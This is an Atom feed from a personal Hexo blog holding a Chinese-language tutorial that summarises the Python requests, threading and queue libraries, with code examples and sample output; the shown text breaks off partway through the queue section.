<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-09-06T02:32:30.138Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python库总结</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88148%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（148）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-09-06T02:32:30.138Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x01-requests-库font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-requests-库font"></a> <font color="navy">0x01 requests 库</font></h3><blockquote><p><a href="https://requests.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">相关链接</a></p></blockquote><h4 id="1发送请求"><a class="markdownIt-Anchor" href="#1发送请求"></a> 1.发送请求</h4><p><code>get 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">header = &#123;</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://www.baidu.com'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; '</span>,</span><br><span class="line">            <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数信息</span></span><br><span class="line">para = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># cookies</span></span><br><span class="line">cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=header, params = para, allow_redirects=<span class="keyword">False</span>, cookies=cookies, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>post 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 除了参数信息的方式不一样外，其余信息和get一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, data=header, params = para, allow_redirects=<span class="keyword">False</span>, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>请求的参数</code></p><p><strong>① 参数</strong></p><blockquote><p>具体的可以看上面</p></blockquote><p><strong>② Cookies</strong></p><blockquote><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br></pre></td></tr></table></figure><blockquote><p>要想发送你的cookies到服务器，可以使用 <code>cookies</code> 参数：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><p><strong>③ 重定向</strong></p><blockquote><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code>history</code> 方法来追踪重定向。</p><p><a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.history" target="_blank" rel="noopener"><code>Response.history</code></a> 是一个 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener"><code>Response</code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p></blockquote><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure><p>如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 <code>allow_redirects</code> 参数禁用重定向处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">301</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p><strong>④ 超时</strong></p><p>你可以告诉 requests 在经过以 <code>timeout</code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><p><font size="2">注意：<code>timeout</code> 仅对连接过程有效，与响应体的下载无关。 <code>timeout</code> 并不是整个下载响应的时间限制，而是如果服务器在 <code>timeout</code> 秒内没有应答，将会引发一个异常（更精确地说，是在 <code>timeout</code> 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</font></p><h4 id="2requests库主要的7个方法"><a class="markdownIt-Anchor" href="#2requests库主要的7个方法"></a> 2.requests库主要的7个方法</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>requests.request()</td><td>构造一个请求，支撑一下各方法的基础方法</td></tr><tr><td>requests.get()</td><td>获取HTML网页的主要方法，对应HTTP的GET</td></tr><tr><td>requests.post()</td><td>向HTML网页提交POST请求方法，对应HTTP的POST</td></tr><tr><td>requests.put()</td><td>向HTML网页提交PUT请求的方法，对应HTTP的RUT</td></tr><tr><td>requests.head()</td><td>获取HTML网页头的信息方法，对应HTTP的HEAD</td></tr><tr><td>requests.patch()</td><td>向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td>requests.delete()</td><td>向HTML页面提交删除请求,对应HTTP的DELETE</td></tr></tbody></table><h4 id="3response对象的属性"><a class="markdownIt-Anchor" href="#3response对象的属性"></a> 3.response对象的属性</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>r.status_code</td><td>HTTP请求的返回状态</td></tr><tr><td>r.text</td><td>HTTP响应内容的字符串形式，即：url对应的页面内容</td></tr><tr><td>r.encoding</td><td>从HTTP  header中猜测的响应内容编码方式</td></tr><tr><td>r.apparent_encoding</td><td>从内容中分析出的响应内容编码方式（备选编码方式）</td></tr><tr><td>r.content</td><td>HTTP响应内容的二进制形式</td></tr><tr><td>r.headers</td><td>获得头部信息</td></tr><tr><td>r.url</td><td>获得链接</td></tr></tbody></table><h3 id="font-color-navy0x02-threading-库多线程font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-threading-库多线程font"></a> <font color="navy">0x02 threading 库（多线程）</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br></pre></td></tr></table></figure><blockquote><p>我们要创建 Thread 对象,然后让它们运行，每个 Thread 对象代表一个线程，在每个线程中我们可以让程序处理不同的任务，这就是多线程编程。</p><p><strong>值得注意的是，程序运行时默认就是在主线程上</strong></p><p>创建 Thread 对象有 2 种手段。</p><ol><li>直接创建 Thread ，将一个 callable 对象从类的构造器传递进去，这个 callable 就是回调函数，用来处理任务。</li><li>编写一个自定义类继承 Thread，然后复写 run() 方法，在 run() 方法中编写任务处理代码，然后创建这个 Thread 的子类。</li></ol></blockquote><h4 id="1创建-thread-对象"><a class="markdownIt-Anchor" href="#1创建-thread-对象"></a> 1.创建 Thread 对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threading</span>.<span class="title">Thread</span><span class="params">(group=None, target=None, name=None, args=<span class="params">()</span>, kwargs=&#123;&#125;, *, daemon=None)</span></span></span><br></pre></td></tr></table></figure><blockquote><ul><li><p><em>group</em> 应该为 <code>None</code>；为了日后扩展 <code>ThreadGroup</code> 类实现而保留。</p></li><li><p><em>target</em> 是用于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法调用的可调用对象。默认是 <code>None</code>，表示不需要调用任何方法。</p></li><li><p><em>name</em> 是线程名称。默认情况下，由 “Thread-<em>N</em>” 格式构成一个唯一的名称，其中 <em>N</em> 是小的十进制数。</p></li><li><p><em>args</em> 是用于调用目标函数的参数元组。默认是 <code>()</code>。</p></li><li><p><em>kwargs</em> 是用于调用目标函数的关键字参数字典。默认是 <code>{}</code>。</p></li><li><p>如果不是 <code>None</code>，<em>daemon</em> 参数将显式地设置该线程是否为守护模式。 如果是 <code>None</code> (默认值)，线程将继承当前线程的守护模式属性。</p></li><li><p>如果子类型重载了构造函数，它一定要确保在做任何事前，先发起调用基类构造器(<code>Thread.__init__()</code>)。</p></li></ul></blockquote><h4 id="2threadingthread-的方法"><a class="markdownIt-Anchor" href="#2threadingthread-的方法"></a> 2.threading.Thread 的方法</h4><blockquote><p>先说几个最常用的，以后再进行补充</p></blockquote><p>① <code>threading.active_count</code>() / <code>threading.activeCount</code>()</p><p>返回当前存活的线程类 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。返回的计数等于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.enumerate" target="_blank" rel="noopener"><code>enumerate()</code></a> 返回的列表长度。</p><p>② <code>threading.current_thread</code>() / <code>threading.currentThread</code>()</p><p>返回当前对应调用者的控制线程的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。如果调用者的控制线程不是利用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#module-threading" target="_blank" rel="noopener"><code>threading</code></a> 创建，会返回一个功能受限的虚拟线程对象。其还可以调用几个实例化方法：</p><ul><li>isAlive(): 返回线程是否活动的</li><li>getName(): 返回线程名</li><li>setName(): 设置线程名</li><li>name(): 返回当前线程的名称</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">threading.current_thread().setName(<span class="string">"主线程"</span>) <span class="comment">#设置线程名字</span></span><br><span class="line">print(threading.current_thread().isAlive()) <span class="comment">#线程是不是活动的</span></span><br><span class="line">print(<span class="string">"当前线程"</span>,threading.current_thread())</span><br><span class="line">print(<span class="string">"获取当前线程名字"</span>,threading.current_thread().getName()</span><br></pre></td></tr></table></figure><p>③ <code>start</code>()</p><blockquote><p>开始线程活动。它在一个线程里最多只能被调用一次。它安排对象的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法在一个独立的控制进程中调用。如果同一个线程对象中调用这个方法的次数大于一次，会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。</p></blockquote><p>④ <code>run</code>()</p><blockquote><p>代表线程活动的方法。你可以在子类型里重载这个方法。 标准的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法会对作为 <em>target</em> 参数传递给该对象构造器的可调用对象（如果存在）发起调用，并附带从 <em>args</em> 和 <em>kwargs</em> 参数分别获取的位置和关键字参数。</p></blockquote><p>⑤ <code>join</code>(timeout=None)`</p><blockquote><ul><li><p>等待，直到线程终结。这会阻塞调用这个方法的线程，直到被调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 的线程终结 – 不管是正常终结还是抛出未处理异常 – 或者直到发生超时，超时选项是可选的。</p></li><li><p>当 <em>timeout</em> 参数存在而且不是 <code>None</code> 时，它应该是一个用于指定操作超时的以秒为单位的浮点数或者分数。因为 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 总是返回 <code>None</code> ，所以你一定要在 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 后调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.is_alive" target="_blank" rel="noopener"><code>is_alive()</code></a> 才能判断是否发生超时 – 如果线程仍然存活，则 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 超时。</p></li><li><p>当 <em>timeout</em> 参数不存在或者是 <code>None</code> ，这个操作会阻塞直到线程终结。</p></li><li><p>一个线程可以被 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 很多次。</p></li><li><p>如果尝试加入当前线程会导致死锁， <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。如果尝试 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 一个尚未开始的线程，也会抛出相同的异常。</p></li></ul></blockquote><p>⑥ <code>daemon</code></p><blockquote><p>一个表示这个线程是（True）否（False）守护线程的布尔值。一定要在调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.start" target="_blank" rel="noopener"><code>start()</code></a> 前设置好，不然会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。初始值继承于创建线程；主线程不是守护线程，因此主线程创建的所有线程默认都是 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.daemon" target="_blank" rel="noopener"><code>daemon</code></a> = <code>False</code>。下面先看一段代码：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        print(threading.current_thread().name+<span class="string">' test '</span>,i)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>)</span><br><span class="line"><span class="comment"># thread = threading.Thread(target=test,name='TestThread',daemon=True)</span></span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>程序运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">TestThread test  4</span><br></pre></td></tr></table></figure><p><font size="2">MainThread 没有代码运行的时候，TestThread 还在运行。这是因为 MainThread 在等待其他线程的结束。TestThread 中 daemon 属性默认是 False，这使得 MainThread 需要等待它的结束，自身才结束。**如果要达到，MainThread 结束，子线程也立马结束，怎么做呢？**其实很简单，只需要在子线程调用 start() 方法之前设置 daemon 就好了。当然也可以在子线程的构造器中传递 daemon 的值为 True。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>,daemon=<span class="keyword">True</span>)</span><br><span class="line"><span class="comment"># thread.setDaemon(True)</span></span><br></pre></td></tr></table></figure><h4 id="3threading锁问题"><a class="markdownIt-Anchor" href="#3threading锁问题"></a> 3.threading锁问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.lock = threading.RLock()</span><br></pre></td></tr></table></figure><p>其方法有：</p><ul><li><p><code>acquire</code>(<em>blocking=True</em>, <em>timeout=-1</em>)</p><p>可以阻塞或非阻塞地获得锁。当无参数调用时： 如果这个线程已经拥有锁，递归级别增加一，并立即返回。否则，如果其他线程拥有该锁，则阻塞至该锁解锁。一旦锁被解锁(不属于任何线程)，则抢夺所有权，设置递归等级为一，并返回。如果多个线程被阻塞，等待锁被解锁，一次只有一个线程能抢到锁的所有权。在这种情况下，没有返回值。当发起调用时将 <em>blocking</em> 参数设为真值，则执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将 <em>blocking</em> 参数设为假值，则不进行阻塞。 如果一个无参数调用将要阻塞，则立即返回 <code>False</code>；在其他情况下，执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将浮点数的 <em>timeout</em> 参数设为正值时，只要无法获得锁，将最多阻塞 <em>timeout</em> 所指定的秒数。 如果已经获得锁则返回 <code>True</code>，如果超时则返回假值。<em>在 3.2 版更改:</em> 新的 <em>timeout</em> 形参。</p></li><li><p><code>release</code>()</p><p>释放锁，自减递归等级。如果减到零，则将锁重置为非锁定状态(不被任何线程拥有)，并且，如果其他线程正被阻塞着等待锁被解锁，则仅允许其中一个线程继续。如果自减后，递归等级仍然不是零，则锁保持锁定，仍由调用线程拥有。只有当前线程拥有锁才能调用这个方法。如果锁被释放后调用这个方法，会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。没有返回值。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_writeReult</span><span class="params">(self, result)</span>:</span></span><br><span class="line">    self.lock.acquire()<span class="comment"># 获取锁</span></span><br><span class="line">    <span class="keyword">with</span> open(self.oFileName, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result + <span class="string">"\n"</span>)<span class="comment"># 写入文件</span></span><br><span class="line"> self.lock.release()<span class="comment"># 释放锁</span></span><br></pre></td></tr></table></figure><h4 id="4thread继承问题"><a class="markdownIt-Anchor" href="#4thread继承问题"></a> 4.thread继承问题</h4><p>前面讲过，直接初始化一个 Thread，然后，现在还有一种方式就是自定义一个 Thread 的子类，然后复写它的 run() 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name=None)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            print(threading.current_thread().name + <span class="string">' test '</span>, i)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">thread = TestThread(name=<span class="string">'TestThread'</span>)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>上面的代码，我们自定义了 TestThread 这个类，然后继承了 threading.Thread。</p><p>只有在 run() 方法中处理逻辑。最终代码运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread test  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">123456789101112131415</span><br></pre></td></tr></table></figure><h4 id="5相关问题"><a class="markdownIt-Anchor" href="#5相关问题"></a> 5.相关问题</h4><blockquote><ol><li>run()和start()的区别是什么？</li><li>如何继承构造线程？</li></ol></blockquote><h4 id="6参考文章"><a class="markdownIt-Anchor" href="#6参考文章"></a> 6.参考文章</h4><ol><li><a href="https://blog.csdn.net/briblue/article/details/85101144" target="_blank" rel="noopener">Python多线程编程(一）：threading 模块 Thread 类的用法详解</a></li><li><a href="https://blog.csdn.net/weixin_40481076/article/details/101594705" target="_blank" rel="noopener">python多线程详解（超详细）</a></li></ol><h3 id="font-color-navy0x03-queue-库font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-queue-库font"></a> <font color="navy">0x03 queue 库</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br></pre></td></tr></table></figure><h4 id="1queue的常用方法"><a class="markdownIt-Anchor" href="#1queue的常用方法"></a> 1.queue的常用方法</h4><p>①  <code>q.put(item, block=True, timeout=None)</code></p><ul><li>item：放入队列中的数据元素。</li><li>block：当队列中元素个数达到上限继续往里放数据时：如果 block=False，直接引发 queue.Full 异常；如果 block=True，且 timeout=None，则一直等待直到有数据出队列后可以放入数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有位置放入数据就引发 queue.Full 异常。</li><li>timeout：设置超时时间。</li></ul><p>② <code>q.put_nowait(item)</code></p><blockquote><p>相当于 Queue.put(item, block=False)，当队列中元素个数达到上限继续往里放数据时直接引发 queue.Full 异常。</p></blockquote><p>③ <code>q.get(block=True, timeout=None)</code></p><blockquote><p>从队列中取出数据并返回该数据内容。</p></blockquote><ul><li>block：当队列中没有数据元素继续取数据时：如果 block=False，直接引发 queue.Empty 异常；如果 block=True，且 timeout=None，则一直等待直到有数据入队列后可以取出数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有数据放入的话就引发 queue.Empty 异常。</li><li>timeout：设置超时时间。</li></ul><p>④ <code>q.get_nowait()</code></p><blockquote><p>相当于 Queue.get(block=False)block，当队列中没有数据元素继续取数据时直接引发 queue.Empty 异常。</p></blockquote><p>⑤ <code>q.qsize()</code></p><blockquote><p>返回队列中数据元素的个数。</p></blockquote><p>⑥ <code>q..empty()</code></p><blockquote><p>如果队列为空，返回 True，否则返回 False。</p><p>示例如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br><span class="line">print(q.empty())  <span class="comment"># 对列为空，返回 True</span></span><br><span class="line">q.put(<span class="string">'python-100'</span>)  <span class="comment"># 